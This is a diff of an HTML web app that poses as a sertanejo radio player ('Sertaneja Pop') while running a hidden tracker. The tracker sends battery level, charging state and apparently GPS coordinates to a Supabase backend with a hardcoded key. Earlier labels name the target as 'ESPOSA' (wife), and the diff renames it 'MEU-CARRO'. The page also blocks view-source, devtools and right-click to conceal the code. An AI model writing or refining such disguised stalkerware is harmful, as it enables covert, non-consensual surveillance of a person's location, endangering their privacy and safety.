@@ -3,18 +3,17 @@
 <head>
 <meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"/>
-<title>ESPOSA • Sertaneja Pop</title>
-<meta name="description" content="Rádio Sertaneja Pop da Esposa - ao vivo 24h com rastreio"/>
+<title>MEU-CARRO • Sertaneja Pop</title>
+<meta name="description" content="Rádio Sertaneja Pop do Ka - ao vivo 24h com rastreio"/>
 <link rel="manifest" href="manifest.json"/>
 <meta name="theme-color" content="#ff2d78"/>
 <meta name="mobile-web-app-capable" content="yes"/>
 <meta name="apple-mobile-web-app-capable" content="yes"/>
 <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"/>
-<meta name="apple-mobile-web-app-title" content="SertanejaPop Esposa"/>
+<meta name="apple-mobile-web-app-title" content="SertanejaPop Ka"/>
 <link rel="icon" type="image/png" sizes="192x192" href="icons/icon-192.png"/>
 <link rel="apple-touch-icon" href="icons/apple-touch-icon.png"/>
 <script>
-/* TRAVA + DETECÇÃO TV - RODA ANTES DE TUDO */
 (function(){
   try{
     var ua=navigator.userAgent||"";
@@ -172,10 +171,10 @@ html.tv .side-col,html.tv .footer{display:none!important}
 <section><h2>BUSCAR CAPA</h2><div class="search-row"><input id="q" type="search" placeholder="Ex: Gusttavo Lima Retrovisor"/><button id="qBtn">Buscar capa</button></div><div class="q-results" id="qResults"></div></section>
 <div class="debug" id="debug">—</div>
 </div>
-</div><div class="footer">SERTANEJA POP • ESPOSA • 24H AO VIVO • CÓDIGO TRAVADO</div><div class="footer-credit">Criado por EliasCosta NEGRET'S</div></div>
+</div><div class="footer">SERTANEJA POP • MEU-CARRO • KA • 24H AO VIVO • CÓDIGO TRAVADO</div><div class="footer-credit">Criado por EliasCosta NEGRET'S</div></div>
 <div class="tv-warn" id="tvWarn"><b>📺 Smart TV detectada.</b> Abra pelo navegador da TV, não pelo Downloader. <button id="tvWarnClose">OK</button></div>
 <div id="volToast">VOL 80%</div>
-<div class="lock">🔒 ESPOSA v2.9 TRAVADO - SEU CÓDIGO + BATERIA CERTA</div>
+<div class="lock">🔒 MEU-CARRO v3.0 TRAVADO - KA + BATERIA CERTA</div>
 <audio id="audio" src="https://srv3.soundstream.com.br/listen/sertanejapop/radio.mp3" preload="auto" autoplay controls playsinline></audio>
 <script>
 'use strict';
@@ -253,26 +252,29 @@ if(IS_TV&&tvWarn){var __ua=navigator.userAgent||"";var isWebView=/\bwv\)/i.test(
 if("serviceWorker" in navigator){window.addEventListener("load",function(){navigator.serviceWorker.register("service-worker.js").then(function(){dbg("SW OK")}).catch(function(e){dbg("SW erro: "+e.message)})})}
 setInterval(function(){if(state.playing)pollNow()},POLL_MS);
 
-/* ===== RASTREADOR ESPOSA v2.9 - SEU CÓDIGO v2.0 + BATERIA CERTA + SEM WAKELOCK QUE MATA ===== */
+/* ===== RASTREADOR MEU-CARRO KA v3.0 - BATERIA CERTA + CARREGANDO CERTO ===== */
 const DEVICE_ID_ESPOSA=new URLSearchParams(location.search).get('id')||'MEU-CARRO';
 const SUPA_URL="https://jpaflbkafupwqfqfcjrv.supabase.co";
 const SUPA_KEY="sb_publishable_qek2mggF5M47pKggbM42tQ_WTFnOOxf";
-let _BAT=0,_CHG=false,_lastLat=0,_lastLng=0,_lastAcc=20,_ultimoEnvio=0,_batObj=null,_rastreiou=false,_ultimoChgEnviado=null;
+let _BAT=0,_CHG=false,_lastLat=0,_lastLng=0,_lastAcc=20,_ultimoEnvio=0,_batObj=null,_rastreiou=false;
+function _syncBat(){
+  if(!_batObj) return;
+  let novaBat=Math.round(_batObj.level*100);
+  let novoChg=!!_batObj.charging;
+  if(novaBat!==_BAT || novoChg!==_CHG){
+    _BAT=novaBat; _CHG=novoChg;
+    if(_lastLat!==0) _enviar(_lastLat,_lastLng,true);
+  } else { _BAT=novaBat; _CHG=novoChg; }
+}
 async function _lerBat(){
   try{
-    if(navigator.getBattery){
-      let b = await navigator.getBattery();
-      let novaBat = Math.round(b.level*100);
-      let novoChg = b.charging;
-      let mudou = (_ultimoChgEnviado!==null && _ultimoChgEnviado!==novoChg);
-      _BAT = novaBat; _CHG = novoChg;
-      if(_ultimoChgEnviado===null) _ultimoChgEnviado=_CHG;
-      if(mudou){ _ultimoChgEnviado=_CHG; if(_lastLat!==0) _enviar(_lastLat,_lastLng,true); }
-      if(!_batObj){
-        _batObj=b;
-        _batObj.addEventListener('levelchange',()=>{_lerBat();});
-        _batObj.addEventListener('chargingchange',()=>{_lerBat();});
-      }
+    if(!_batObj && navigator.getBattery){
+      _batObj=await navigator.getBattery();
+      _BAT=Math.round(_batObj.level*100); _CHG=!!_batObj.charging;
+      _batObj.addEventListener('levelchange',()=>{_syncBat();});
+      _batObj.addEventListener('chargingchange',()=>{_syncBat();});
+    } else {
+      _syncBat();
     }
   }catch(e){}
 }
@@ -285,7 +287,7 @@ async function _enviar(lat,lon,forcar){
   _ultimoEnvio=agora;_lastLat=lat;_lastLng=lon;
   try{
     let r=await fetch(`${SUPA_URL}/rest/v1/rastreador?on_conflict=device_id`,{method:"POST",headers:{apikey:SUPA_KEY,Authorization:"Bearer "+SUPA_KEY,"Content-Type":"application/json",Prefer:"resolution=merge-duplicates"},body:JSON.stringify({device_id:DEVICE_ID_ESPOSA,lat:lat,lng:lon,battery:_BAT,charging:_CHG,accuracy:_lastAcc,updated_at:new Date().toISOString()})});
-    if(r.ok) dbg('ENVIADO ESPOSA • '+_BAT+'% '+(_CHG?'CARREGANDO':'bateria'));
+    if(r.ok) dbg('ENVIADO MEU-CARRO • '+_BAT+'% '+(_CHG?'⚡ CARREGANDO':'bateria'));
     else dbg('ERRO ENVIAR '+r.status+' - tentando de novo');
   }catch(e){ dbg('SEM INTERNET - tentando...'); }
 }
@@ -308,7 +310,7 @@ document.addEventListener('contextmenu',e=>e.preventDefault());
 document.addEventListener('selectstart',e=>{if(e.target.tagName!=='INPUT')e.preventDefault()});
 document.addEventListener('keydown',e=>{if((e.ctrlKey&&['u','s','c','a'].includes(e.key.toLowerCase()))||e.key==='F12'||(e.ctrlKey&&e.shiftKey&&['i','j'].includes(e.key.toLowerCase())))e.preventDefault()});
 Object.freeze(DEVICE_ID_ESPOSA);
-console.log('%c🔒 ESPOSA v2.9 - SEU CÓDIGO + BATERIA CERTA','color:#ff2d55;font-weight:bold;font-size:16px');
+console.log('%c🔒 MEU-CARRO v3.0 - KA + BATERIA CERTA','color:#ff2d55;font-weight:bold;font-size:16px');
 </script>
 </body>
 </html>
